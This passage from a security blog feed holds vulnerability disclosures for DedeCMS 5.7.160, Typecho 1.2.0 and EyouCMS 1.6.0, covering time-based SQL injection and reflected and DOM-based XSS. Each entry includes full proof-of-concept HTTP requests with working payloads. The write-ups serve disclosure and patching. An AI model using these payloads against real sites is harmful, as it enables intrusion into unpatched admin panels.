class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fgroup_store.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
      <link href="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/"/>
      <url>/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend story catalog blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/story_catalog.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>Requires <code>PHP ≤ 5</code> and <code>MySQL ≤ 5.5</code>, and the story component contains at least one record in database.</li><li>In the source code of <code>/dede/story_catalog.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/story_catalog.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fstory_books.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS V5.7.160 Backend Reflected XSS</title>
      <link href="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/"/>
      <url>/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend image file upload with reflected-XSS in uploaded filename.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>In <code>/dede/upload.php</code>, upload an new image file named “file”, with the filename contains XSS payload, e.g. <code>&lt;img src=x onerror=alert(1)&gt;.png</code>.</li><li>The uploaded filename must ends with a normal image extension, e.g. <code>.png</code> or <code>.jpeg</code>, and the file content must contains the legal image file header, filename should not contains and <code>/</code> or <code>\</code>.</li><li>The response of <code>/dede/upload.php</code> contains the XSS payload with the <code>text/html</code> content-type.</li></ol><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/2.png"></p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/3.png"></p><p>In source code, the filename is directly passed through the <code>pathinfo</code> function and assigned to <code>$res[&#39;remark&#39;]</code>, and finally echoed json encoded array, which contains the XSS payload, and by default, the response content-type is <code>text/html</code>.</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/4.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>317</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8dr4oJI5ByNkMbkK</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C4_1%2C5_1%2C6_1%2C2_1%2C3_1; PHPSESSID=n5ibb5j70gj24qh8alr61u6ov2; _csrf_name_1d27e3c9=426b27a62d00e1341c13019bf34f4d05; _csrf_name_1d27e3c91BH21ANI1AGD297L1FF21LN02BGE1DNG=6e24882e1c219de6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=c7079a345e8c8682; DedeLoginTime=1677347766; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8163b03f86d69dc6; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fcontent_i_list.php%3Fchannelid%3D2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK</span></span><br><span class="line"><span class="language-mel">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;.png&quot;</span></span></span><br><span class="line"><span class="language-mel">Content-Type: <span class="keyword">image</span>/png</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">PNG</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">IHDR(-SPLTEà<span class="number">22</span>ßÿêé]³ôß&amp;&amp;<span class="number">1</span>%dIDATc<span class="string">``</span><span class="string">`dbfaec@,¶hQGÜYIEND®B`</span></span></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK--</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho V1.2.0 Backend Reflected XSS</title>
      <link href="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
      <url>/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho V1.2.0 Backend DOM-Based XSS</title>
      <link href="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
      <url>/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45542)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file management editor with reflected-XSS in the GET value <code>filename</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=edit&amp;filename=li|&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--sts_media.htm&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201612233-8e16dccb-774b-433b-b6f2-306216deb043.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/33">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45542">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45537)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Background article publish with reflected-XSS in the cookie <code>ENV_LIST_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D=cn; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201614458-17b781bf-148a-419c-9b92-7e9f0527d78d.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/34">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45537">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45538)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/</url>
      
